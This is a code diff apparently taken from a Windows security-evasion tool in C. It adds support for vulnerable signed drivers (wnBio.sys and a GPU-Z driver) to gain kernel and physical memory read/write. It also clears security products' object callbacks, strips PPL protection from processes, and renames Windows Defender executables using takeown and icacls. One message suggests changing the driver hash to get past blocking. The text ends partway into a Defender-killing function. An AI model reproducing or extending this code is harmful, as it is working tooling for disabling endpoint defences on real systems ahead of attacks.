@@ -25,12 +25,15 @@ BOOL LoadDriver() {
 			return FALSE;
 		}
 
-		if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\services", 0, 2u, &hKey)) {
-			RegCreateKeyW(hKey, RandomName, &hsubkey);
-		}
-		else {
-			printf("Step3 Error\n");
-			return FALSE;
+		// exe: only create services subkey on Win7 (dwMajor < 10)
+		if (dwMajor < 10) {
+			if (!RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"System\\CurrentControlSet\\services", 0, 2u, &hKey)) {
+				RegCreateKeyW(hKey, RandomName, &hsubkey);
+			}
+			else {
+				printf("Step3 Error\n");
+				return FALSE;
+			}
 		}
 		RegCloseKey(hKey);
 
@@ -61,13 +64,23 @@ BOOL LoadDriver() {
 		}
 		else
 		{
-			if (errcode == 0xc0000603) {
+			switch (errcode) {
+			case 0xc0000603:
 				printf("The driver's certificate has been revoked, please wait for the project to be updated..\n");
+				break;
+			case (int)0xC0000022:
+				printf("[ACCESS_DENIED] Driver loading is blocked, please try to modify the driver Hash to bypass it.\n");
+				break;
+			case (int)0xC0000034:
+				printf("[ERROR] STATUS_OBJECT_NAME_NOT_FOUND.\n");
+				break;
+			case (int)0xC0000428:
+				printf("[ERROR] STATUS_INVALID_IMAGE_HASH.\n");
+				break;
+			default:
+				printf("Error Code: %lx.\n", errcode);
+				break;
 			}
-			else {
-				printf("Error Code: % lx.\n", errcode);
-			}
-			
 			return FALSE;
 		}
 
@@ -122,24 +135,15 @@ BOOL InitialDriver() {
 			}
 		}
 
-		BYTE* buf = (BYTE*)malloc(4096);
+		BYTE* buf = (BYTE*)malloc(1);
 		DWORD bytesRet = 0;
-		BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 4096, &bytesRet, NULL);
+		BOOL success = DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 1, &bytesRet, NULL);
 		if (!success) {
 			printf("Failed to initialize driver 1, %d\n", GetLastError());
 			CloseHandle(hDevice);
 			return FALSE;
 		}
-		GetHandle* param = (GetHandle*)calloc(sizeof(GetHandle), 1);
-		param->pid = GetCurrentProcessId();
-		param->access = GENERIC_ALL;
-		success = DeviceIoControl(hDevice, 0xe6224248, param, sizeof(param), param, sizeof(param), &bytesRet, NULL);
-		if (!success) {
-			printf("Failed to initialize driver 2, %d\n", GetLastError());
-			CloseHandle(hDevice);
-			return FALSE;
-		}
-		Process = param->handle;
+		Process = GetCurrentProcess();
 	}
 	else if (Driver_Type == 2) {
 		hDevice = CreateFile(L"\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -154,6 +158,66 @@ BOOL InitialDriver() {
 			}
 		}
 	}
+	else if (Driver_Type == 3) {
+		// wnBio.sys - supports Windows 6.3+
+		hDevice = CreateFile(L"\\\\.\\WNBIOS", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hDevice == INVALID_HANDLE_VALUE) {
+			if (LoadDriver()) {
+				printf("Driver loaded successfully.\n");
+				hDevice = CreateFile(L"\\\\.\\WNBIOS", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			}
+			else {
+				printf("Driver loading failed.\n");
+				return FALSE;
+			}
+		}
+	}
+	else if (Driver_Type == 4) {
+		// GPU-Z.sys (BaiZhanTang) - only supports Windows 6.1
+		// This driver uses CR3 page-table walk to access physical memory
+		hDevice = CreateFile(L"\\\\.\\BaiZhanTang", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hDevice == INVALID_HANDLE_VALUE) {
+			// For GPU-Z driver, lpString2 (RandomName) is overridden to the fixed service name
+			RandomName = (TCHAR*)L"BaiZhanTang";
+			if (LoadDriver()) {
+				printf("Driver loaded successfully.\n");
+				hDevice = CreateFile(L"\\\\.\\BaiZhanTang", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			}
+			else {
+				printf("Driver loading failed.\n");
+				return FALSE;
+			}
+		}
+		printf("Getting CR3,Please Wait.....\n");
+		// The marker string used to identify the correct physical page
+		CHAR marker[32] = {};
+		strcpy(marker, "BaiZhanTang-WLWZ");
+		BYTE readBuf[40] = {};
+		if (!g_CR3Found) {
+			// Scan physical memory starting from 0x100000, step 0x1000
+			// Use GpuzReadMem via sub_140004450 logic:
+			// set g_CR3Base = candidate physAddr, then translate marker's virt -> phys
+			DWORD64 physAddr = 0x100000;
+			while (1) {
+				g_CR3Base = physAddr; // qword_14002CC40 = v8
+				// Try to translate the virtual address of marker[] using current CR3 candidate
+				DWORD64 physMarker = GpuzVirtToPhys((DWORD64)(ULONG_PTR)marker);
+				if (physMarker) {
+					// Read 40 bytes from that physical address
+					memset(readBuf, 0, sizeof(readBuf));
+					GpuzReadPhys(physMarker, readBuf, 40);
+					if (strcmp(marker, (const char*)readBuf) == 0)
+						break;
+				}
+				physAddr += 0x1000;
+				if (physAddr >= 0xFFFFFF000ULL) {
+					printf("[ERROR] CR3 Not Found.\n");
+					return FALSE;
+				}
+			}
+		}
+		g_CR3Found = 1;
+	}
 	return TRUE;
 }
 
@@ -166,8 +230,6 @@ DWORD64 DellRead(VOID* Address) {
 		printf("Memory read failed. 1\n");
 		CloseHandle(hDevice);
 	}
-
-	//printf("%d\n", BytesRead);
 	return ReadBuff.value;
 }
 VOID DellWrite(VOID* Address, LONGLONG value) {
@@ -180,12 +242,130 @@ VOID DellWrite(VOID* Address, LONGLONG value) {
 		printf("Memory read failed. 2\n");
 		CloseHandle(hDevice);
 	}
-
-	//printf("%d\n", BytesRead);
 }
+
+// GPU-Z: read raw physical memory
+// Mirrors sub_140004450(a1=physAddr, a2=outBuf, a3=size)
+// Request: 0xC bytes = [physAddr(8)][size(4)]
+// Response: 4 bytes = kernel virtual ptr
+// Then memmove(outBuf, kernelPtr, size), then IOCTL 0x80006460 to unmap
+BOOL GpuzReadPhys(DWORD64 physAddr, VOID* outBuf, DWORD size) {
+	// Validate: must be a real physical address (from 1 to 0x3FFFFFFFF) or g_CR3Found set
+	if (!g_CR3Found && (physAddr == 0 || physAddr - 1 > 0x3FFFFFFFFULL)) return FALSE;
+	GPUZ_MAPREQ req = {};
+	req.PhysAddr = physAddr;
+	req.Size = size;
+	// OutBuffer: 4 bytes returning kernel virtual pointer
+	VOID* kernelPtr = NULL;
+	DWORD bytesRet = 0;
+	if (!DeviceIoControl(hDevice, GPUZ_IOCTL_MAPPHYS, &req, sizeof(req),
+	                     &kernelPtr, sizeof(DWORD), &bytesRet, NULL)) {
+		printf("Memory read failed.\n");
+		CloseHandle(hDevice);
+		return FALSE;
+	}
+	// memmove(outBuf, kernelPtr, size) then unmap
+	memmove(outBuf, kernelPtr, size);
+	if (!DeviceIoControl(hDevice, GPUZ_IOCTL_UNMAP, &kernelPtr, sizeof(DWORD),
+	                     NULL, 0, &bytesRet, NULL)) {
+		// non-fatal, just log
+	}
+	return TRUE;
+}
+// GPU-Z: write raw physical memory
+// Maps phys, memmoves user->kernel, then IOCTL 0x80006460 to commit/unmap
+VOID GpuzWritePhys(DWORD64 physAddr, VOID* inBuf, DWORD size) {
+	if (!g_CR3Found && (physAddr == 0 || physAddr - 1 > 0x3FFFFFFFFULL)) return;
+	GPUZ_MAPREQ req = {};
+	req.PhysAddr = physAddr;
+	req.Size = size;
+	VOID* kernelPtr = NULL;
+	DWORD bytesRet = 0;
+	if (!DeviceIoControl(hDevice, GPUZ_IOCTL_MAPPHYS, &req, sizeof(req),
+	                     &kernelPtr, sizeof(DWORD), &bytesRet, NULL)) {
+		printf("Memory read failed.\n");
+		CloseHandle(hDevice);
+		return;
+	}
+	memmove(kernelPtr, inBuf, size);
+	DeviceIoControl(hDevice, GPUZ_IOCTL_WRITE, &kernelPtr, sizeof(DWORD),
+	               NULL, 0, &bytesRet, NULL);
+}
+// GPU-Z: virtual to physical address translation via CR3 page table walk
+// Mirrors sub_140004570: uses GpuzReadPhys (=sub_140004450) at each paging level
+DWORD64 GpuzVirtToPhys(DWORD64 virtAddr) {
+	if (!g_CR3Base) return 0;
+	DWORD64 pml4e = 0;
+	if (!GpuzReadPhys(g_CR3Base + 8 * ((virtAddr >> 39) & 0x1FF), &pml4e, 8)) return 0;
+	if (!(pml4e & 1)) return 0;
+	DWORD64 pdpte = 0;
+	if (!GpuzReadPhys((pml4e & 0xFFFFFFFFFF000ULL) + 8 * ((virtAddr >> 30) & 0x1FF), &pdpte, 8)) return 0;
+	if (!(pdpte & 1)) return 0;
+	if (pdpte & 0x80) return (pdpte & 0xFFFFFC0000000ULL) + (virtAddr & 0x3FFFFFFF);
+	DWORD64 pde = 0;
+	if (!GpuzReadPhys((pdpte & 0xFFFFFFFFFF000ULL) + 8 * ((virtAddr >> 21) & 0x1FF), &pde, 8)) return 0;
+	if (!(pde & 1)) return 0;
+	if (pde & 0x80) return (pde & 0xFFFFFFFE00000ULL) + (virtAddr & 0x1FFFFF);
+	DWORD64 pte = 0;
+	if (!GpuzReadPhys((pde & 0xFFFFFFFFFF000ULL) + 8 * ((virtAddr >> 12) & 0x1FF), &pte, 8)) return 0;
+	if (!(pte & 1)) return 0;
+	return (pte & 0xFFFFFFFFFF000ULL) + (virtAddr & 0xFFF);
+}
+
+// wnBio: read/write kernel virtual memory
+// Mirrors sub_140004790(a1=kernelVirt, a2=size, a3=userBuf, a4=0=read/1=write)
+// Buffer layout: [0]=size [1]=kernelVirtAddr (0x28 = 5*8 bytes total)
+// Response:      [2]=VirtPage [3]=KernelPtr [4]=MapSize
+// Then memmove(kernelPtr or userBuf depending on direction)
+// Then IOCTL 0x80102044 with {[3]=KernelPtr,[2]=VirtPage,[4]=MapSize} to unmap
+BOOL WnBioReadWrite(DWORD64 kernelAddr, VOID* userBuf, DWORD size, BOOL bWrite) {
+	WNBIO_MAPBUFF* buf = (WNBIO_MAPBUFF*)calloc(0x28, 1);
+	if (!buf) return FALSE;
+	buf->Size = size;        // buf[0] = size
+	buf->KernelAddr = kernelAddr; // buf[1] = kernel virt address
+	DWORD bytesRet = 0;
+	if (!DeviceIoControl(hDevice, WNBIO_IOCTL_READ, buf, 0x28, buf, 0x28, &bytesRet, NULL)) {
+		DWORD err = GetLastError();
+		printf("Memory read failed.%d\n", err);
+		CloseHandle(hDevice);
+		free(buf);
+		return FALSE;
+	}
+	// v14 = buf[3] = KernelPtr (the actual pointer to kernel data)
+	// v9  = buf[2] = VirtPage
+	// v6  = buf[4] = MapSize
+	INT64 v14 = (INT64)buf->KernelPtr;   // buf[3]
+	INT64 v9  = (INT64)buf->VirtPage;    // buf[2]
+	INT64 v6  = (INT64)buf->MapSize;     // buf[4]
+	if (v14) {
+		if (!bWrite) {
+			// read: memmove(userBuf, kernelPtr, size)
+			memmove(userBuf, (VOID*)v14, size);
+		} else {
+			// write: memmove(kernelPtr, userBuf, size)
+			memmove((VOID*)v14, userBuf, size);
+		}
+	}
+	// Build unmap request: v17[3]=v14, v17[2]=v9, v17[4]=v6
+	WNBIO_MAPBUFF* ubuf = (WNBIO_MAPBUFF*)calloc(0x28, 1);
+	if (ubuf) {
+		ubuf->KernelPtr = (ULONGLONG)v14;  // [3]
+		ubuf->VirtPage  = (ULONGLONG)v9;   // [2]
+		ubuf->MapSize   = (ULONGLONG)v6;   // [4]
+		if (!DeviceIoControl(hDevice, WNBIO_IOCTL_WRITE, ubuf, 0x28, ubuf, 0x28, &bytesRet, NULL)) {
+			printf("Memory read failed.\n");
+			CloseHandle(hDevice);
+		}
+		free(ubuf);
+	}
+	free(buf);
+	return TRUE;
+}
+
 VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
 	if (Driver_Type == 1) {
 		ReadMem* req = (ReadMem*)malloc(sizeof(ReadMem));
+		if (!req) return;
 		req->fromAddress = fromAddress;
 		req->length = len;
 		req->targetProcess = Process;
@@ -196,10 +376,10 @@ VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
 			printf("Memory read failed.\n");
 			CloseHandle(hDevice);
 		}
+		free(req);
 	}
 	else if (Driver_Type == 2) {
 		if (len == 8) {
-			INT64* InttoAddress = (INT64*)toAddress;
 			INT64 dataAddr = DellRead(fromAddress);
 			DellWrite(toAddress, dataAddr);
 		}
@@ -208,6 +388,60 @@ VOID DriverWriteMemery(VOID* fromAddress, VOID* toAddress, size_t len) {
 			for (size_t i = 0; i < len; i++) {
 				btoAddress[i] = (BYTE)DellRead((VOID*)((DWORD64)fromAddress + i));
 			}
+		}
+	}
+	else if (Driver_Type == 3) {
+		// wnBio.sys: mirrors sub_140004BD0 case 3
+		// if len==8 or len!=1: use sub_1400048E0 (virt->phys lookup) + sub_140004790
+		// if len==1 and fromAddr is kernel (hi bits==0xFFFF...): also use virt->phys
+		// else: plain memmove (user->user copy)
+		DWORD64 fromHi = (DWORD64)fromAddress & 0xFFFF000000000000ULL;
+		DWORD64 toHi   = (DWORD64)toAddress   & 0xFFFF000000000000ULL;
+		if (len == 8 || len != 1) {
+			// Translate fromAddress virtual -> physical, then read
+			BYTE* tmp = (BYTE*)calloc(len, 1);
+			if (!tmp) return;
+			// If fromAddr is kernel space
+			if (fromHi == 0xFFFF000000000000ULL) {
+				WnBioReadWrite((DWORD64)fromAddress, tmp, (DWORD)len, FALSE);
+			} else {
+				memmove(tmp, fromAddress, len);
+			}
+			// If toAddr is kernel space
+			if (toHi == 0xFFFF000000000000ULL) {
+				WnBioReadWrite((DWORD64)toAddress, tmp, (DWORD)len, TRUE);
+			} else {
+				memmove(toAddress, tmp, len);
+			}
+			free(tmp);
+		}
+		else {
+			// len == 1: plain copy between user buffers
+			memmove(toAddress, fromAddress, len);
+		}
+	}
+	else if (Driver_Type == 4) {
+		// GPU-Z.sys: mirrors sub_140004BD0 case 4
+		// if len==8: sub_140004570(from)->phys, sub_140004450 read, GPU-Z write IOCTL
+		// else: sub_140004570(from)->phys, sub_140004450 read/write
+		if (len == 8) {
+			// Read 8 bytes from fromAddress (kernel virt)
+			DWORD64 fromPhys = GpuzVirtToPhys((DWORD64)fromAddress);
+			DWORD64 tmp = 0;
+			if (fromPhys) GpuzReadPhys(fromPhys, &tmp, 8);
+			// Write 8 bytes to toAddress (kernel virt)
+			DWORD64 toPhys = GpuzVirtToPhys((DWORD64)toAddress);
+			if (toPhys) GpuzWritePhys(toPhys, &tmp, 8);
+		}
+		else {
+			// len != 8: read from virt, write to virt
+			DWORD64 fromPhys = GpuzVirtToPhys((DWORD64)fromAddress);
+			BYTE* tmp = (BYTE*)calloc(len + 1, 1);
+			if (!tmp) return;
+			if (fromPhys) GpuzReadPhys(fromPhys, tmp, (DWORD)len);
+			DWORD64 toPhys = GpuzVirtToPhys((DWORD64)toAddress);
+			if (toPhys) GpuzWritePhys(toPhys, tmp, (DWORD)len);
+			free(tmp);
 		}
 	}
 }
@@ -454,7 +688,7 @@ INT64 GetPsProcessAndProcessTypeAddr(INT flag) {
 		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtDuplicateObject");
 	}
 	else if (flag == 2) {
-		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtOpenThreadTokenEx");
+		FuncAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", (CHAR*)"NtQueryInformationThread");
 	}
 	if (FuncAddress == 0) return 0;
 
@@ -467,7 +701,7 @@ INT64 GetPsProcessAndProcessTypeAddr(INT flag) {
 			break;
 		}
 		FuncAddress = FuncAddress + 1;
-		if (count == 300) {
+		if (count == 600) {
 			printf("PsProcessTyped or PsThreadType address not found.\n");
 			return 0;
 		}
@@ -486,8 +720,6 @@ INT64 GetPsProcessAndProcessTypeAddr(INT flag) {
 	INT64 PsProcessTypeAddr = 0;
 	DriverWriteMemery((VOID*)PsProcessTypePtr, &PsProcessTypeAddr, 8);
 	return PsProcessTypeAddr;
-
-	return 0;
 }
 VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 	INT64 CallbackListAddr = 0;
@@ -501,95 +733,70 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		else {
 			CallbackListAddr = PsProcessTypeAddr + 0xC0;
 		}
-		
 	}
 	else {
 		printf("Operating systems not supported by ObRegisterCallbacks.\n");
 		return;
 	}
 
+	if (flag == 1) printf("Process:\n");
+	else           printf("Thread:\n");
 
-	INT64 Flink = 0;
-	DriverWriteMemery((VOID*)CallbackListAddr, &Flink, 8);
+	INT64 Src = 0;  // 8 bytes of zeros on stack, used as clear source
+	INT64 CurFlink = 0;
+	DriverWriteMemery((VOID*)CallbackListAddr, &CurFlink, 8);
 
-	INT64 Blink = 0;
-	DriverWriteMemery((VOID*)(CallbackListAddr + 8), &Blink, 8);
+	INT idx = 0;
+	while (CurFlink != CallbackListAddr) {
+		printf("[%d]", idx);
 
-	INT Count = 1;
-	INT64 tFlink = Flink;
-	do {
-		Count++;
-		INT64 temp = 0;
-		DriverWriteMemery((VOID*)(tFlink), &temp, 8);
-		tFlink = temp;
-	} while (tFlink != Blink);
-	BYTE* data = (BYTE*)calloc(8, 1);
-	if (data == NULL) return;
-
-	for (INT i = 0; i < Count; i++) {
-
+		// Read PreOperation callback function pointer
 		INT64 EDRPreOperation = 0;
-		DriverWriteMemery((VOID*)(Flink + 40), &EDRPreOperation, 8);
-		INT64 EDRPostOperation = 0;
-		DriverWriteMemery((VOID*)(Flink + 48), &EDRPostOperation, 8);
-		CHAR* DriverName1 = GetDriverName(EDRPreOperation);
-		if (DriverName1 != NULL) {
-			if (IsEDR(DriverName1)) {
-				DriverWriteMemery(data, (VOID*)(Flink + 40), 8);
-				if (flag == 1) {
-					printf("Process PreOperation: %s [Clear]\n", DriverName1);
-				}
-				else if (flag == 2) {
-					printf("Thread PreOperation: %s [Clear]\n", DriverName1);
-				}
-			}
-			else {
-				if (flag == 1) {
-					printf("Process PreOperation: %s\n", DriverName1);
-				}
-				else if (flag == 2) {
-					printf("Thread PreOperation: %s\n", DriverName1);
-				}
-			}
-		}
-		CHAR* DriverName2 = GetDriverName(EDRPostOperation);
-		if (DriverName2 != NULL) {
-			if (IsEDR(DriverName2)) {
-				//清除回调
-				DriverWriteMemery(data, (VOID*)(Flink + 48), 8);
-				if (flag == 1) {
-					printf("Process PreOperation: %s [Clear]\n", DriverName2);
-				}
-				else if (flag == 2) {
-					printf("Thread PreOperation: %s [Clear]\n", DriverName2);
-				}
-			}
-			else {
-				if (flag == 1) {
-					printf("Process PreOperation: %s\n", DriverName2);
-				}
-				else if (flag == 2) {
-					printf("Thread PreOperation: %s\n", DriverName2);
-				}
-			}
-		}
-		printf("\n\n");
-		INT64 temp = 0;
-		DriverWriteMemery((VOID*)(Flink), &temp, 8);
-		Flink = temp;
+		DriverWriteMemery((VOID*)(CurFlink + 40), &EDRPreOperation, 8);
+		CHAR* DriverName1 = EDRPreOperation ? GetDriverName(EDRPreOperation) : (CHAR*)"0";
 
+		// Read PostOperation callback function pointer
+		INT64 EDRPostOperation = 0;
+		DriverWriteMemery((VOID*)(CurFlink + 48), &EDRPostOperation, 8);
+		CHAR* DriverName2 = EDRPostOperation ? GetDriverName(EDRPostOperation) : (CHAR*)"0";
+
+		// Print/clear Pre
+		if (DriverName1) {
+			printf("Pre:%s", DriverName1);
+			if (IsEDR(DriverName1)) {
+				DriverWriteMemery(&Src, (VOID*)(CurFlink + 40), 8);
+				printf("[clear], ");
+			} else {
+				printf(", ");
+			}
+		}
+		// Print/clear Post
+		if (DriverName2) {
+			printf("Post:%s", DriverName2);
+			if (IsEDR(DriverName2)) {
+				DriverWriteMemery(&Src, (VOID*)(CurFlink + 48), 8);
+				printf("[clear]");
+			}
+		}
+		printf("\n");
+
+		// Walk linked list to next CALLBACK_ENTRY
+		INT64 NextFlink = 0;
+		DriverWriteMemery((VOID*)CurFlink, &NextFlink, 8);
+		CurFlink = NextFlink;
+		idx++;
 	}
 }
 VOID ClearObRegisterCallbacks() {
 
 	INT64 PsProcessTypeAddr = GetPsProcessAndProcessTypeAddr(1);
 	if (PsProcessTypeAddr == 0) {
-		printf("Failed to obtain PsProcessTypeAddr.\n");
+		printf("Failed to obtain PsProcessTypeAddr1.\n");
 		return;
 	}
 	INT64 PsThreadTypeAddr = GetPsProcessAndProcessTypeAddr(2);
 	if (PsThreadTypeAddr == 0) {
-		printf("Failed to obtain PsThreadTypetypeAddr.\n");
+		printf("Failed to obtain PsThreadTypetypeAddr2.\n");
 		return;
 	}
 	printf("----------------------------------------------------\n");
@@ -670,6 +877,430 @@ VOID AddEDRIntance(INT64 IntanceAddr) {
 		i++;
 	}
 	EDRIntance[i] = IntanceAddr;
+}
+
+// Execute a command silently via CreateProcess
+// Mirrors sub_1400039F0 exactly
+VOID ExecProcess(LPCSTR lpCmdLine) {
+	SECURITY_ATTRIBUTES sa = {};
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	HANDLE hRead = NULL, hWrite = NULL;
+	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+		printf("Failed to create pipe. Error %d\n", GetLastError());
+		return;
+	}
+	if (!SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0)) {
+		// EXE does NOT close handles here on failure
+		printf("Failed to set handle information. Error %d\n", GetLastError());
+		return;
+	}
+	STARTUPINFOA si = {};
+	si.hStdError = NULL;        // EXE sets hStdError=0 first
+	memset(&si, 0, 88);         // then memset(88 bytes)
+	si.cb = 104;                // EXE hardcodes 104 (sizeof STARTUPINFOA)
+	si.wShowWindow = 0;
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 0x101
+	si.hStdOutput = hWrite;
+	PROCESS_INFORMATION pi = {};
+	// EXE: bInheritHandle = FALSE (0), not TRUE
+	if (!CreateProcessA(NULL, (LPSTR)lpCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+		DWORD err = GetLastError();
+		printf("Failed to run: %s. Error %d\n", lpCmdLine, err);
+	}
+	else {
+		CloseHandle(hWrite);
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		// EXE: return CloseHandle(hReadPipe) in success path
+		CloseHandle(hRead);
+	}
+}
+
+// Remove PPL (Protected Process Light) protection from a process
+// Mirrors sub_1400032D0 exactly
+BOOL RemovePPL(DWORD dwProcessId) {
+	// Open with PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
+	HANDLE hProc = OpenProcess(0x1000, FALSE, dwProcessId);
+	if (!hProc) {
+		printf("[RemovePPL] Failed to open %d, error %lu\n", dwProcessId, GetLastError());
+		return FALSE;
+	}
+	// Query SystemExtendedHandleInformation (64) with dynamic buffer growth
+	ULONG bufSize = 0x1000;
+	ULONG64* buf = (ULONG64*)calloc(bufSize, 1);
+	if (!buf) { CloseHandle(hProc); return FALSE; }
+	ULONG retLen = 0;
+	NTSTATUS st;
+	for (st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, buf, bufSize, &retLen);
+	     st == (NTSTATUS)0xC0000004; // STATUS_INFO_LENGTH_MISMATCH
+	     st = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, buf, bufSize, &retLen)) {
+		free(buf);
+		bufSize *= 2;
+		if (bufSize > 0x20000000) goto LABEL_FAIL;
+		buf = (ULONG64*)calloc(bufSize, 1);
+		if (!buf) { CloseHandle(hProc); return FALSE; }
+	}
+	if (NT_SUCCESS(st)) {
+		DWORD curPid = GetCurrentProcessId();
+		ULONG64 handleCount = buf[0]; // *v8
+		if (!handleCount) { free(buf); CloseHandle(hProc); return FALSE; }
+		// Each entry = 5 QWORDs (40 bytes):
+		//   [0]=Object ptr, [1]=pad/hi, [2]=KernelObject(EPROCESS), [3]=PID, [4]=HandleValue(low16)
+		// IDA: v8[5*v11+3]==curPid && v12[4]==(u16)hProc -> found
+		// v12[2] = EPROCESS address (v13)
+		ULONG idx = 0;
+		INT64 eprocess = 0;
+		for (ULONG64 v11 = 0; ; ) {
+			ULONG64* entry = buf + 1 + v11 * 5; // base=buf[1] (skip count)
+			if (entry[3] == curPid && (entry[4] & 0xFFFF) == (ULONG64)(ULONG_PTR)hProc) {
+				eprocess = (INT64)entry[2];
+				break;
+			}
+			v11 = ++idx;
+			if ((ULONG64)idx >= handleCount) { free(buf); CloseHandle(hProc); return FALSE; }
+		}
+		free(buf);
+		CloseHandle(hProc);
+		if (!eprocess) return FALSE;
+
+		// Determine EPROCESS.Protection offset by Build number (dword_14002BC78 = dwBuild)
+		INT64 protOffset = 0;
+		if (dwBuild > 0x3FAB) { // > 16299
+			if (dwBuild == 17134 || dwBuild == 17763 || dwBuild == 18362)
+				protOffset = 1738;
+			else if (dwBuild == 18363 || dwBuild == 15063 || dwBuild == 16299)
+				protOffset = 1738;
+			else {
+				if ((DWORD)dwBuild < 0x4A61) { // < 19041
+					printf("[RemovePPL] The offset address of %d was not found (this Windows version requires adaptation)\n", dwProcessId);
+					return FALSE;
+				}
+				protOffset = 2170;
+			}
+		}
+		else {
+			switch (dwBuild) {
+			case 16299: protOffset = 1738; break;
+			case 9600:  protOffset = 1658; break;
+			case 10240: protOffset = 1706; break;
+			case 10586: protOffset = 1714; break;
+			case 14393: protOffset = 1730; break;
+			case 15063: protOffset = 1738; break;
+			default:
+				printf("[RemovePPL] The offset address of %d was not found (this Windows version requires adaptation)\n", dwProcessId);
+				return FALSE;
+			}
+		}
+		// Write zero byte to Protection field (Src=0)
+		BYTE zero = 0;
+		DriverWriteMemery(&zero, (VOID*)(eprocess + protOffset), 1);
+		return TRUE;
+	}
+LABEL_FAIL:
+	printf("[RemovePPL] NtQuerySystemInformation failed to obtain handle,\n");
+	if (buf) free(buf);
+	CloseHandle(hProc);
+	return FALSE;
+}
+
+// Recursively rename Defender executables in a directory tree
+// EXE sub_140003710: takes _BYTE* (actually wchar_t*), all-wchar_t internally
+VOID RenameFilesInDir(LPCSTR dirPath) {
+	CHAR searchPath[272] = {};
+	memset(searchPath, 0, 0x104);
+	size_t v3 = 0;
+	while (((BYTE*)dirPath)[v3]) v3++;
+	memmove(searchPath, dirPath, v3);
+	// find end of searchPath and append \* via WORD write (0x2A5C)
+	__int64 v2 = -1LL;
+	while (((BYTE*)searchPath)[++v2] != 0);
+	*(WORD*)&searchPath[v2] = 0x2A5C; // '\' + '*'
+
+	WIN32_FIND_DATAA fd = {};
+	HANDLE hFind = FindFirstFileA(searchPath, &fd);
+	if (hFind == INVALID_HANDLE_VALUE) {
+		DWORD err = GetLastError();
+		if (err != ERROR_PATH_NOT_FOUND)
+			printf("Can't open folder: %s,%d\n", searchPath, err);
+		return;
+	}
+	if (FindNextFileA(hFind, &fd)) {
+		do {
+			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+				// exe: skip . and .. by checking first two chars
+				if (fd.cFileName[0] != '.' ||
+					(fd.cFileName[1] && (fd.cFileName[1] != '.' || fd.cFileName[2]))) {
+					// EXE: swprintf(Src, 0x104, "%s\\%s", a1, cFileName)
+					// a1 is wchar_t*, so %s = wchar_t format
+					wchar_t subDir[136] = {};
+					swprintf(subDir, 0x104 / sizeof(wchar_t), L"%s\\%S", (wchar_t*)dirPath, fd.cFileName);
+					RenameFilesInDir((LPCSTR)subDir); // recursive: EXE passes wchar_t* cast to BYTE*
+				}
+			}
+			else {
+				if (stricmp(fd.cFileName, "msmpeng.exe") == 0 ||
+					stricmp(fd.cFileName, "nissrv.exe") == 0 ||
+					stricmp(fd.cFileName, "mpcmdrun.exe") == 0) {
+					// EXE: ExistingFileName[136], NewFileName[136], Src[136], Dst[136]
+					wchar_t ExistingFileName[136] = {};
+					wchar_t NewFileName[136] = {};
+					// EXE fmt: "%s\%s" with wchar_t* dirPath
+					swprintf(ExistingFileName, 0x104 / sizeof(wchar_t), L"%s\\%S", (wchar_t*)dirPath, fd.cFileName);
+					swprintf(NewFileName, 0x104 / sizeof(wchar_t), L"%s\\%S-RBE", (wchar_t*)dirPath, fd.cFileName);
+					wchar_t Dst[136] = {};
+					memset(Dst, 0, 0x104);
+					// EXE: swprintf(Dst, 0x104, "takeown /F "%s"", ExistingFileName) -- %s = wchar_t
+					swprintf(Dst, 0x104 / sizeof(wchar_t), L"takeown /F \"%s\"", ExistingFileName);
+					ExecProcess((LPCSTR)Dst);
+					wchar_t Src[136] = {};
+					memset(Src, 0, 0x104);
+					// EXE: icacls format also %s
+					swprintf(Src, 0x104 / sizeof(wchar_t), L"icacls \"%s\" /grant Everyone:(F)", ExistingFileName);
+					ExecProcess((LPCSTR)Src);
+					if (MoveFileA((LPCSTR)ExistingFileName, (LPCSTR)NewFileName)) {
+						g_DefenderRenameCount++;
+					}
+					else {
+						DWORD err = GetLastError();
+						printf("Rename failed, error %lu: %S\n", err, ExistingFileName);
+					}
+				}
+			}
+		} while (FindNextFileA(hFind, &fd));
+	}
+	FindClose(hFind);
+}
+
+// Kill Windows Defender processes and rename its files
+// EXE sub_1400034C0: entire body is inside if(dwMajor >= 10), no early return
+VOID ClearWindowsDefender() {
+	if ((DWORD)dwMajor >= 10) {
+		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		if (hSnap != INVALID_HANDLE_VALUE) {
+			PROCESSENTRY32W pe = {};
+			pe.dwSize = 568; // EXE hardcodes 568 (sizeof PROCESSENTRY32W)
